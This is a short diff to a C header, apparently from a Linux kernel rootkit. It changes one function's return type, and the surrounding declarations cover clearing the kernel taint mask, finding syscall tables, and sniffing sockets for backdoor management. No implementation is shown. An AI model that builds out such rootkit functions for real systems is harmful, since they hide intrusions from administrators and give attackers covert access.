@@ -124,7 +124,7 @@ void kv_send_signal(int, struct task_struct *);
 struct kernel_syscalls *kv_kall_load_addr(void);
 
 /** resets tainted_mask */
-void kv_reset_tainted(unsigned long *);
+int kv_reset_tainted(unsigned long *);
 
 /** socket,networking,backdoor management */
 struct task_struct *kv_sock_start_sniff(void);
